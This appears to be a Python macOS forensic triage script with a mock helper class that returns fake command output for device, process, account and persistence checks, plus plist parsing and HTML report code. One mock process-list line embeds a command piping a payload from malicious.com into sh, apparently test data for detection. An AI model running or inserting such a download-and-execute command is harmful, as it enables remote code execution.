...
# Assuming IRISX_app.utils.helpers is available
# For this example, I'm defining a mock helpers with the necessary functions
# In your actual environment, this would be imported from your project structure
class MockAppInstance:
    def __init__(self):
        self.suspect_computer_name = "Test_Computer"
        self.report_output_directory = "reports" # Define a default report directory for testing

    def log_output(self, *args):
        # Simple print for logging in this example
        print(*args)

class Helpers:
    def run_command(self, command, check_shell=False, app_instance=None):
        """Mock function for running shell commands. Replace with your actual implementation."""
        # Corrected: Call log_output directly on app_instance
        app_instance.log_output(f"MOCK: Running command: {command}")
        # Return mock data for system_profiler commands
        if "system_profiler -xml SPUSBDataType" in command:
...
<array>
	<dict>
		...
		<array>
			<dict>
				<key>_name</key>
				<string>USB 3.1 Bus</string>
				<key>_productID</key>
				<string>0x1234</string>
				<key>_vendorID</key>
				<string>0x5678 (Apple Inc.)</string>
				<key>_items</key>
				<array>
					<dict>
						<key>_name</key>
						<string>External Drive®</string>
						<key>manufacturer</key>
						<string>Seagate®</string>
						<key>product_id</key>
						<string>0x074d</string>
						<key>serial_num</key>
						<string>ABC123DEF456</string>
						<key>vendor_id</key>
						<string>0x0bc2 (Seagate Technology LLC)</string>
						<key>location_id</key>
						<string>0x00100000 / 1</string>
					</dict>
				</array>
			</dict>
            <dict>
                <key>_name</key>
                <string>Integrated Webcam</string>
                <key>manufacturer</key>
                <string>Generic USB Vendor</string>
                <key>product_id</key>
                <string>0x0a0a</string>
                <key>vendor_id</key>
                <string>0x0b0b</string>
                <key>serial_num</key>
                <string>WEB12345</string>
                <key>location_id</key>
                <string>0x00200000 / 2</string>
            </dict>
		</array>
	</dict>
</array>
...
"""
        elif "system_profiler -xml SPCameraDataType" in command:
            return """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
    <dict>
        ...
        <array>
            ...
            <dict>
                <key>_name</key>
                <string>Logitech C920</string>
                <key>manufacturer</key>
                <string>Logitech</string>
                <key>model_id</key>
                <string>UVC Camera VendorID_046d ProductID_082d</string>
                <key>unique_id</key>
                <string>0x046D082D00000000</string>
            </dict>
        </array>
    </dict>
</array>
...
"""
        elif "system_profiler -xml SPBluetoothDataType" in command:
            return """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
...
"""
        elif "sysctl -n hw.memsize" in command:
            return "17179869184" # 16 GB in bytes
        elif "vm_stat" in command:
            return """
Mach Virtual Memory Statistics: (page size of 4096 bytes)
Pages free: 154625.
Pages active: 1898730.
Pages inactive: 1256780.
Pages speculative: 12345.
Pages throttled: 6789.
Pages wired down: 789012.
Pages purgeable: 0.
Pages occupied by physical pages that have been decompressed: 567890.
Pages file-backed: 1234567.
"""
        elif "sysctl vm.swapusage" in command:
            return "vm.swapusage: total = 1024.00M used = 123.45M free = 900.55M (encrypted)"
        elif "diskutil list -plist" in command:
            return """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	...
	<array>
		<dict>
			...
			<array>
				<dict>
					<key>Content</key>
					<string>APFS_Container_Reference</string>
					<key>DeviceIdentifier</key>
					<string>disk0s2</string>
...
"""
        elif "system_profiler SPNVMeDataType SPSerialATADataType" in command:
            # Mock serial for a generic product
            return """
NVMExpress:

  Macintosh HD:

    Capacity: 500.28 GB (500,277,539,840 bytes)
    Model: APPLE SSD AP0512M
    Serial Number: C177264024V01GAAE
    Link Speed: 8.0 GT/s
    Link Width: x4
"""
        elif "df -h" in command:
            # Mock df output for a mount point
            if "System/Volumes/Data" in command:
                return """
Filesystem                       Size   Used  Avail Capacity iused      ifree %iused  Mounted on
/dev/disk1s1s1                  465Gi  400Gi   50Gi    89% 1234567 1234567890    0%   /
"""
            return "" # Default empty if no specific mount point
        elif "dscl . -list /Users" in command:
            return "Guest\n_mbsetupuser\n_spotlight\nspencer\n"
        elif "dscl . -read /Groups/admin GroupMembership" in command:
            return "GroupMembership: root spencer"
        elif "ls /Users" in command:
            return "Guest\nspencer\nShared\n"
        elif "ps aux" in command:
            return """
USER       PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
spencer   1234   0.1  0.5 4567892 87654 ??  S    1:00PM    0:01.23 /Applications/Safari.app/Contents/MacOS/Safari
root      5678   0.0  0.1 1234567 12345 ??  S    Jul20     0:00.50 /usr/sbin/syslogd
spencer   9012   0.0  0.2 2345678 23456 ??  S    Jul20     0:00.30 /usr/bin/python3 -c import os; os.system('curl http://malicious.com/payload.sh | sh')
"""
        elif "sudo launchctl list" in command:
            return """
PID   Status   Label
-     0        com.apple.loginwindow.cleanerevents
1234  0        com.example.myagent
"""
        elif "sudo ls /Library/LaunchDaemons/" in command:
            return "com.example.daemon.plist\n"
        elif "sudo ls /System/Library/LaunchDaemons/" in command:
            return "com.apple.metadata.mds.plist\n"
        elif "sudo ls /Library/LaunchAgents/" in command:
            return "com.example.globalagent.plist\n"
        elif "ls /Users/spencer/Library/LaunchAgents/" in command:
            return "com.example.useragent.plist\n"
        elif "crontab -l" in command:
            return "# no crontab for spencer\n"
        elif "sudo cat /etc/crontab" in command:
            return "# No system crontab"
        elif "sudo ls -l /etc/cron.daily/" in command:
            return "total 0\n-rwxr-xr-x 1 root wheel 0 Jan 1 2024 daily_script.sh\n"
        
        # Mock reading plist files directly
        elif "read_plist_file" in command:
            if "com.example.daemon.plist" in command:
                return {
            ...
            elif "com.example.globalagent.plist" in command:
                 return {
                    "Label": "com.example.globalagent",
                    "Program": "/Applications/App.app/Contents/MacOS/AppHelper",
                    "RunAtLoad": True
                }
            elif "com.example.useragent.plist" in command:
                 return {
                    "Label": "com.example.useragent",
                    "ProgramArguments": ["/Users/spencer/bin/myuserapp", "--background"],
                    "StartInterval": 3600
                }
        return "" # Default empty string for other commands
    ...
    def read_plist_file(self, file_path, app_instance=None):
        ...
        if os.path.exists(file_path):
            try:
                # For demonstration, hardcode some mock responses
                ...
                elif "com.apple.metadata.mds.plist" in file_path:
                    return {
                        "Label": "com.apple.metadata.mds",
                        "Program": "/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/A/Support/mds"
                    }
                elif "com.example.globalagent.plist" in file_path:
                    return {
                        "Label": "com.example.globalagent",
                        "Program": "/Applications/App.app/Contents/MacOS/AppHelper",
                        "RunAtLoad": True
                    }
                elif "com.example.useragent.plist" in file_path:
                    return {
                        "Label": "com.example.useragent",
                        "ProgramArguments": ["/Users/spencer/bin/myuserapp", "--background"],
                        "StartInterval": 3600
                    }
                # Default for other plists if needed, or raise an error for unknown
                app_instance.log_output(f"MOCK: No specific mock data for plist: {file_path}. Attempting real load.")
                with open(file_path, 'rb') as fp:
                    return plistlib.load(fp)
            except Exception as e:
                app_instance.log_output(f"MOCK: Error reading mock plist {file_path}: {e}")
                return None
        app_instance.log_output(f"MOCK: Plist file not found: {file_path}")
        return None

    def generate_report_html(self, app_instance, computer_name, filename, title, body_content, browser_preference):
        """
        Generates an HTML report and saves it to a file.
        Updated to ensure UTF-8 encoding.
        """
        full_html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    ...
    <style>
        ...
        .note {{ background-color: #fff3cd; border-left: 5px solid #ffc107; padding: 10px; margin-top: 20px; }}
        .error {{ color: red; font-weight: bold; }}
        .success {{ color: green; font-weight: bold; }}
    </style>
</head>
<body>
    <h1>{title} for {computer_name}</h1>
    <p>Report generated on: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    {body_content}
</body>
</html>
"""
        report_dir = app_instance.report_output_directory
        # Create report directory if it doesn't exist
        os.makedirs(report_dir, exist_ok=True)
        output_path = os.path.join(report_dir, filename)

        try:
            # CRUCIAL: Explicitly specify encoding='utf-8' when writing the file
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(full_html_content)
            app_instance.log_output(f"Report generated: {output_path}")

            # Optional: Open report in browser
            # if browser_preference == "System Default":
            #     webbrowser.open(f"file://{os.path.abspath(output_path)}")
            # else:
            #     app_instance.log_output("Browser preference not implemented beyond system default.")

        except Exception as e:
            app_instance.log_output(f"Error generating HTML report to {output_path}: {e}")


# Initialize mock helpers and app_instance for testing this standalone script
helpers = Helpers()
app_instance = MockAppInstance()
# Make sure the report output directory exists
os.makedirs(app_instance.report_output_directory, exist_ok=True)
        ...
        if '_items' in item and isinstance(item['_items'], list):
            for subitem in item['_items']:
                if isinstance(subitem, dict):
                    ...
                    # Corrected: Call log_output directly on app_instance
                    app_instance.log_output(f"Warning: Skipping non-dictionary subitem in _items for {profile_type}: {type(subitem)} - {str(subitem)[:100]}")

    elif profile_type == 'Bluetooth':
        _extract_bluetooth_devices(item, device_list, app_instance)
    else:
        # Corrected: Call log_output directly on app_instance
        app_instance.log_output(f"Warning: Unknown profile_type '{profile_type}' passed to _extract_nested_devices.")
...
def _extract_flat_device(item: Dict[str, Any], device_list: List[Dict[str, str]], profile_type: str, app_instance: Any):
    ...
    # --- ADDED: Handle the ® symbol by replacing it with its HTML entity ---
    # This is a precaution; the UTF-8 encoding fix should handle the raw symbol directly.
    # But for robustness, converting to entity is safe for HTML.
    if isinstance(name, str):
        name = name.replace("®", "&reg;")
    if isinstance(manufacturer, str):
        manufacturer = manufacturer.replace("®", "&reg;")
    if isinstance(model_id, str):
        model_id = model_id.replace("®", "&reg;")
    # ----------------------------------------------------------------------
    ...
    if device_info and any(v != "N/A" and (isinstance(v, str) and v.strip() != "" or not isinstance(v, str)) for v in device_info.values()):
        ...
        # Corrected: Call log_output directly on app_instance
        app_instance.log_output(f"Debug: Skipping empty or N/A device_info for {profile_type}: {item.get('_name', 'N/A')}")
...
def _extract_bluetooth_devices(item: Dict[str, Any], device_list: List[Dict[str, str]], app_instance: Any):
    ...
    if any(v != "N/A" and (isinstance(v, str) and v.strip() != "" or not isinstance(v, str)) for v in host_controller.values()):
        ...
        # Corrected: Call log_output directly on app_instance
        app_instance.log_output(f"Debug: Skipping empty or N/A Bluetooth host controller: {item.get('_name', 'N/A')}")
    ...
    for key, value in item.items():
        ...
        if isinstance(value, dict) and any(k in value for k in ["device_address", "Address", "_name", "Name", "manufacturer"]):
            ...
            if any(v != "N/A" and (isinstance(v, str) and v.strip() != "" or not isinstance(v, str)) for v in bt_device.values()):
                ...
                # Corrected: Call log_output directly on app_instance
                app_instance.log_output(f"Debug: Skipping empty or N/A Bluetooth device_info for key {key}: {str(value)[:100]}")
            ...
            for sub_item in value:
                if isinstance(sub_item, dict) and any(k in sub_item for k in ["device_address", "Address", "_name", "Name", "manufacturer"]):
                    ...
                    if any(v != "N/A" and (isinstance(v, str) and v.strip() != "" or not isinstance(v, str)) for v in bt_device.values()):
                        ...
                        # Corrected: Call log_output directly on app_instance
                        app_instance.log_output(f"Debug: Skipping empty or N/A Bluetooth sub_item device_info: {str(sub_item)[:100]}")
                else:
                    # Corrected: Call log_output directly on app_instance
                    app_instance.log_output(f"Warning: Skipping non-device dictionary in Bluetooth list: {str(sub_item)[:100]}")
        else:
            ...
            if key not in ["_dataType", "_items", "SPDisplaysDataType", "SPUSBDataType", "SPCameraDataType", "SPBluetoothDataType", "SPNVMeDataType", "SPSerialATADataType"]: # Avoid logging known data types
                # Corrected: Call log_output directly on app_instance
                app_instance.log_output(f"Debug: Skipping non-dict/non-list top-level item in Bluetooth data: {key}: {type(value)} - {str(value)[:100]}")


def _process_sp_device_data(plist_content: Union[str, bytes], data_type_key: str, app_instance: Any) -> List[Dict[str, str]]:
    """Entry point to process the top-level plist structure for system_profiler output.
    
    Args:
        plist_content: The raw plist content, either as a string or bytes.
        data_type_key: The expected data type key (e.g., 'SPUSBDataType').
        app_instance: The application instance for logging.
    
    Returns:
        A list of dictionaries, each representing a parsed device.
    """
    parsed_devices = []
    ...
    try:
        # Ensure plist_content is bytes for plistlib.loads
        if isinstance(plist_content, str):
            plist_bytes = plist_content.encode('utf-8')
        else:
            plist_bytes = plist_content
        ...
        if isinstance(plist_root, list) and len(plist_root) > 0 and isinstance(plist_root[0], dict):
            ...
            if root_dict.get('_dataType') == data_type_key:
                ...
                if isinstance(items_list, list):
                    ...
                    # Corrected: Call log_output directly on app_instance
                    app_instance.log_output(f"Warning: Expected '_items' in {data_type_key} to be a list, got {type(items_list)} instead. Raw: {str(items_list)[:200]}...")
            else:
                ...
                if any(key in root_dict for key in ['_name', 'Name', 'manufacturer', '_SPManufacturer', 'product_id', 'Product ID', 'vendor_id', 'Vendor ID', 'Address', 'device_address', 'connected_devices', 'model_id', 'Model ID', 'unique_id', 'Unique ID']):
                    ...
                    # Corrected: Call log_output directly on app_instance
                    app_instance.log_output(f"Warning: {data_type_key} _dataType mismatch or missing. Raw root_dict: {str(root_dict)[:200]}...")
            ...
            if any(key in plist_root for key in ['_name', 'Name', 'manufacturer', '_SPManufacturer', 'product_id', 'Product ID', 'vendor_id', 'Vendor ID', 'Address', 'device_address', 'connected_devices', 'model_id', 'Model ID', 'unique_id', 'Unique ID']):
                ...
                # Corrected: Call log_output directly on app_instance
                app_instance.log_output(f"Warning: {data_type_key} top-level is dict but no relevant keys found. Raw: {str(plist_root)[:200]}...")
        else:
            # Corrected: Call log_output directly on app_instance
            app_instance.log_output(f"Error: Expected plist root to be a list or dict for {data_type_key}, got {type(plist_root)}. Raw: {str(plist_root)[:200]}...")
            return parsed_devices
        ...
        # Corrected: Call log_output directly on app_instance
        app_instance.log_output(f"Error: system_profiler {data_type_key} -xml output not valid. Snippet: {plist_bytes.decode('utf-8', errors='ignore')[:500]}...")
    except Exception as e:
        # Corrected: Call log_output directly on app_instance
        app_instance.log_output(f"Unexpected error parsing {data_type_key} info: {e}")
...
def sys_info(app_instance, helpers, browser_preference="System Default"):
    ...
    if sys.platform == "darwin":
        ...
        try:
            ...
            usb_info_plist_raw = helpers.run_command("system_profiler -xml SPUSBDataType", check_shell=True, app_instance=app_instance)
            if usb_info_plist_raw:
                # MODIFIED: Call the new _process_sp_device_data
                usb_devices_data = _process_sp_device_data(
                    usb_info_plist_raw, # Pass the raw string/bytes directly
                    'SPUSBDataType',
                    app_instance
                )
                ...
                # Corrected: Call log_output directly on app_instance
                app_instance.log_output("Could not retrieve USB device information via system_profiler.")
                html_body += "<p>Could not retrieve USB device information.</p>"

            # Camera
            html_body += "<h3>Camera Information</h3>"
            camera_info_plist_raw = helpers.run_command("system_profiler -xml SPCameraDataType", check_shell=True, app_instance=app_instance)
            if camera_info_plist_raw:
                # MODIFIED: Call the new _process_sp_device_data
                camera_devices_data = _process_sp_device_data(
                    camera_info_plist_raw, # Pass the raw string/bytes directly
                    'SPCameraDataType',
                    app_instance
                )
                ...
                # Corrected: Call log_output directly on app_instance
                app_instance.log_output("Could not retrieve Camera information via system_profiler.")
                html_body += "<p>No camera found or could not retrieve information.</p>"

            # Bluetooth
            html_body += "<h3>Bluetooth Information</h3>"
            bluetooth_info_plist_raw = helpers.run_command("system_profiler -xml SPBluetoothDataType", check_shell=True, app_instance=app_instance)
            if bluetooth_info_plist_raw:
                if isinstance(bluetooth_info_plist_raw, str):
                    bluetooth_info_plist_bytes = bluetooth_info_plist_raw.encode('utf-8')
                
                # MODIFIED: Call the new _process_sp_device_data
                bluetooth_devices_data = _process_sp_device_data(
                    bluetooth_info_plist_raw, # Pass the raw string/bytes directly
                    'SPBluetoothDataType',
                    app_instance
                )
                ...
                # Corrected: Call log_output directly on app_instance
                app_instance.log_output("Could not retrieve Bluetooth information via system_profiler.")
                html_body += "<p>No Bluetooth devices found or could not retrieve information.</p>"


        except Exception as e: # This is the except block for the try at line 317
            # Corrected: Call log_output directly on app_instance
            app_instance.log_output(f"Error gathering macOS Connected Devices details: {e}")
...
def running_process(app_instance, helpers, browser_preference="System Default"):
    ...
    if sys.platform == "win32":
        ...
        # Corrected: Call log_output directly on app_instance
        app_instance.log_output("For macOS, services are typically managed via LaunchDaemons/Agents.")
...
# --- Example Usage (for testing this combined script) ---
if __name__ == "__main__":
    # Call the main system info function
    sys_info(app_instance, helpers)

    # You can call other diagnostic functions here for testing if desired
    # local_accounts(app_instance, helpers)
    # check_malicious_scripts(app_instance, helpers)
    # running_process(app_instance, helpers)
    # netstat_connections(app_instance, helpers)
    # scheduled_tasks(app_instance, helpers)
